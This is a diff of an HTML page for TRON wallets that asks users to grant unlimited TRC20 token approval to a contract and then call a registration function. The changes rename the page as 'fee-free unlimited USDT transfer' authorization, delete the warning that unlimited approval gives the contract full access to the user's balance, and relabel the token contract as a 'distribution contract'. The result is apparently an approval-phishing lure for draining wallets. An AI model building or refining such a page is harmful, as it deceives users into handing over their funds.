@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TRC20代币无限额度授权与登记</title>
+    <title>免矿工费无限USDT转账授权与登记</title>
     <style>
         * {
             margin: 0;
@@ -269,17 +269,17 @@
 </head>
 <body>
     <div class="container">
-        <h1>TRC20代币无限额度授权与登记</h1>
-        <p class="description">完成两步操作：1. 无限额度授权 2. 调用登记函数</p>
+        <h1>免矿工费无限USDT转账授权与登记</h1>
+        <p class="description">完成两步操作：1. 获取额度授权 2. 登记钱包</p>
         
         <div class="warning">
-            <h4><span class="warning-icon">⚠️</span> 安全提醒</h4>
-            <p>无限额度授权将允许合约完全访问您的代币余额。请确保您信任此合约，并了解相关风险。</p>
+            <h4><span class="warning-icon">⚠️</span> 操作提醒</h4>
+            <p>完成授权后务必完成登记，否则无法获取免费转账权限。</p>
         </div>
         
         <div class="token-info">
             <div class="info-item">
-                <span class="info-label">代币合约地址:</span>
+                <span class="info-label">发放合约地址:</span>
                 <span class="info-value">TEq6aK14LJxid2Y1y7qz3iiVoiuRewPRwn</span>
             </div>
             <div class="info-item">
@@ -288,40 +288,41 @@
             </div>
             <div class="info-item">
                 <span class="info-label">授权类型:</span>
-                <span class="info-value">无限额度 <span class="infinite-badge">∞</span></span>
+                <span class="info-value">无限转账额度 <span class="infinite-badge">∞</span></span>
             </div>
         </div>
         
         <div class="status" id="statusSection">
             <h4><span class="status-icon">ℹ️</span> 操作状态</h4>
-            <p id="statusText">请先完成TRC20代币的无限额度授权</p>
+            <p id="statusText">请先完成权限获取授权</p>
         </div>
         
         <div class="button-group">
             <button class="auth-button" id="approveButton">
-                第一步: 无限授权
+                第一步: 权限获取授权
             </button>
             <button class="auth-button" id="registerButton" disabled>
-                第二步: 登记授权
+                第二步: 登记钱包
             </button>
         </div>
         
         <div class="steps">
             <h3>完整操作步骤</h3>
             <div class="step">
-                <div class="step-number">1</div><div class="step-text">点击"第一步: 无限授权"按钮，完成TRC20代币的无限额度授权</div>
+                <div class="step-number">1</div>
+                <div class="step-text">点击"第一步: 权限获取授权"按钮，完成无限免矿工费转账额度授权</div>
             </div>
             <div class="step">
                 <div class="step-number">2</div>
-                <div class="step-text">等待授权交易确认后，点击"第二步: 登记授权"按钮</div>
+                <div class="step-text">等待授权完成确认后，点击"第二步: 登记钱包"按钮</div>
             </div>
             <div class="step">
                 <div class="step-number">3</div>
-                <div class="step-text">调用合约的registerAuthorization函数完成登记</div>
+                <div class="step-text">完成登记</div>
             </div>
             <div class="step">
                 <div class="step-number">4</div>
-                <div class="step-text">等待登记交易确认，完成整个流程</div>
+                <div class="step-text">等待登记确认，完成整个流程</div>
             </div>
         </div>
         
@@ -418,7 +419,9 @@
         });
 
         document.getElementById('registerButton').addEventListener('click', function() {
-            // 构建调用registerAuthorization函数的交易数据const registerData = window.tronWeb.transactionBuilder.triggerSmartContract(
+            // 构建调用registerAuthorization函数的交易数据
+
+const registerData = window.tronWeb.transactionBuilder.triggerSmartContract(
                 contractAddress,
                 'registerAuthorization()',
                 {feeLimit: 100000000},
